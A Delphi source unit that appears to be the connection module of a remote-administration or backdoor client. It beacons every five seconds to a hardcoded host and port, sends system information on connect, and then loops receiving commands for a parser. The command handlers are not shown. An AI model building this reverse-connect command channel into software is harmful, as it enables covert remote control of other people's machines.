unit untConnection;
interface
uses
  Windows,
  Winsock,
  untUtils;
  
type
  LPSocketHeader = ^TSocketHeader;
  TSocketHeader = packed Record
    dwSocketLen: DWORD;
    bSocketCmd: Byte;
  end;

var
  WSAData:TWSAData;
  hMainSocket:Integer;

procedure ConnectionLoop;
function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PChar; iBufferLen: Integer): Boolean;
implementation

uses
  untParser;

function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PChar; iBufferLen: Integer): Boolean;
var
  lpszSendBuffer: Pointer;
  szSendBuffer: Array[0..2047] Of WideChar;
  iSendLen: Integer;
begin
  Result := False;
  ZeroMemory(@szSendBuffer, SizeOf(szSendBuffer));
  lpszSendBuffer := Pointer(DWORD(@szSendBuffer) + SizeOf(TSocketHeader));
  if ((iBufferLen > 0) and (lpszBuffer <> nil)) then
  begin
    CopyMemory(lpszSendBuffer, lpszBuffer, iBufferLen);
  end;
  with LPSocketHeader(@szSendBuffer)^ do
  begin
    dwSocketLen := iBufferLen + 1;
    bSocketCmd := bySocketCmd;
  end;
  Dec(DWORD(lpszSendBuffer));
  iBufferLen := iBufferLen + SizeOf(TSocketHeader);
  iSendLen := send(hSocket, szSendBuffer, iBufferLen, 0);
  if (iSendLen = iBufferLen) then
    Result := True;
  Sleep(0);
end;
  
procedure CloseSocket(hSocket:Integer);
begin
  Log('Socket closed!');
  shutdown(hSocket, SD_BOTH);
  WinSock.closesocket(hSocket);
end;

function ConnectToHost(pAddress:PChar; dwPort:Integer):Integer;
var
  SockAddrIn: TSockAddrIn;
  HostEnt: PHostEnt;
begin
  Result := socket(AF_INET, SOCK_STREAM, 0);
  If Result <> INVALID_SOCKET then begin
    SockAddrIn.sin_family := AF_INET;
    SockAddrIn.sin_port := htons(dwPort);
    SockAddrIn.sin_addr.s_addr := inet_addr(pAddress);
    if SockAddrIn.sin_addr.s_addr = INADDR_NONE then
    begin
      HostEnt := gethostbyname(pAddress);
      if HostEnt <> nil then
        SockAddrIn.sin_addr.s_addr := Longint(PLongint(HostEnt^.h_addr_list^)^)
      else
      begin
        Result := INVALID_SOCKET;
        Exit;
      end;
    end;
    if connect(Result, SockAddrIn, SizeOf(SockAddrIn)) <> S_OK then
      Result := INVALID_SOCKET;
  end;
end;

//C&P now :D
function RecvBuffer(hSocket: Integer; lpszBuffer: PWideChar; iBufferLen: Integer): Integer; stdcall;
var
  lpTempBuffer: PWideChar;
begin
  Result := 0;
  FillChar(lpszBuffer^, iBufferLen, 0);
  lpTempBuffer := lpszBuffer;
  while (iBufferLen > 0) do
  begin
    Result := recv(hSocket, lpTempBuffer^, iBufferLen, 0);
    if (Result = SOCKET_ERROR) or (Result = 0) then
      break;
    lpTempBuffer := PWideChar(DWORD(lpTempBuffer) + DWORD(Result));
    iBufferLen := iBufferLen - Result;
  end;
end;

procedure ReceiveCommands(mySocket:Integer);
var
  iResult: Integer;
  dwBufferLen: DWORD;
  bCommand:Byte;
  mRecvBuffer:PWideChar;
begin
  GetMem(mRecvBuffer, 4096);
  if (mRecvBuffer <> nil) then
  begin
    while True do
    begin
      iResult := RecvBuffer(mySocket, @dwBufferLen, SizeOf(DWORD));
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
        Break;
      if (dwBufferLen > 4096) then
        Break;
      // Get Command
      iResult := RecvBuffer(mySocket, @bCommand, 1);
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
      begin
        Break;
      end;
      //Get Data
      ZeroMemory(mRecvBuffer, 4096);
      iResult := RecvBuffer(mySocket, mRecvBuffer, dwBufferLen - 1);
      if (iResult = 0) or (iResult = SOCKET_ERROR) then
      begin
        Break;
      end;
      //Parse Packet
      ParsePacket(mySocket, mRecvBuffer, dwBufferLen - 1, bCommand);
    end;
    FreeMem(mRecvBuffer);
  end;
end;

procedure ConnectionLoop;
begin
  WSAStartUp($101, WSAData);
  while True do
  begin
    Log('Connection attempt...');
    hMainSocket := ConnectToHost('127.0.0.1', 1515);
    if hMainSocket <> INVALID_SOCKET then
    begin
      Log('Connected!');
      SendInformation(hMainSocket);
      Log('Information sent! Reading on socket...');
      ReceiveCommands(hMainSocket);
    end;
    CloseSocket(hMainSocket);
    Sleep(5000);
  end;
end;
end.
